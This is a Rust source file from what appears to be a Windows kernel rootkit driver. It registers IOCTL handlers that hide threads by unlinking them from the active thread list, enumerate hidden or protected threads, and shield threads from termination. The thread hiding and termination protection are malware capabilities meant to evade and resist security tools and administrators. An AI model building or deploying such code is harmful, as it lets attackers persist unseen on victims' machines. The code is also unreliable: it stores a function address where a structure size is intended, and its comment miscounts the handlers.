use {
    core::mem::size_of,
    alloc::boxed::Box,
    hashbrown::HashMap,
    shared::{
        ioctls::{
            IOCTL_ENUMERATION_THREAD, IOCTL_HIDE_UNHIDE_THREAD, 
            IOCTL_PROTECTION_THREAD
        }, 
        structs::{EnumerateInfoInput, TargetThread, ThreadListInfo}
    },
    wdk_sys::{IO_STACK_LOCATION, IRP},
    crate::{handle, thread::Thread, utils::ioctls::IoctlHandler},
};

#[cfg(not(feature = "mapper"))]
use {
    crate::thread::add_remove_thread_toggle,
    shared::structs::ThreadProtection,
};

/// Registers the IOCTL handlers for thread-related operations.
///
/// This function inserts two IOCTL handlers into the provided `HashMap`, associating them with
/// their respective IOCTL codes. The two operations supported are:
///
/// # Arguments
/// 
/// - `ioctls`: A mutable reference to a `HashMap<u32, IoctlHandler>` where the thread-related
///   IOCTL handlers will be inserted.
///
pub fn get_thread_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
    // Hide the specified Thread by removing it from the list of active threads.
    ioctls.insert(IOCTL_HIDE_UNHIDE_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle!(stack, Thread::thread_toggle, TargetThread) };
        unsafe { (*irp).IoStatus.Information = size_of::<TargetThread> as u64 };
        status
    }) as IoctlHandler);

    // List hidden or protected threads.
    ioctls.insert(IOCTL_ENUMERATION_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let mut information = 0;
        let status = unsafe { handle!(irp, stack, Thread::enumerate_thread_toggle, EnumerateInfoInput, ThreadListInfo , &mut information) };
        unsafe { (*irp).IoStatus.Information = information as u64 };
        status
    }) as IoctlHandler);

    // If the feature is a mapper, these functionalities will not be added.
    #[cfg(not(feature = "mapper"))] {
        // Responsible for adding thread termination protection.
        ioctls.insert(IOCTL_PROTECTION_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            let status = unsafe { handle!(stack, add_remove_thread_toggle, ThreadProtection) };
            unsafe { (*irp).IoStatus.Information = size_of::<TargetThread> as u64 };
            status
        }) as IoctlHandler);
    }
}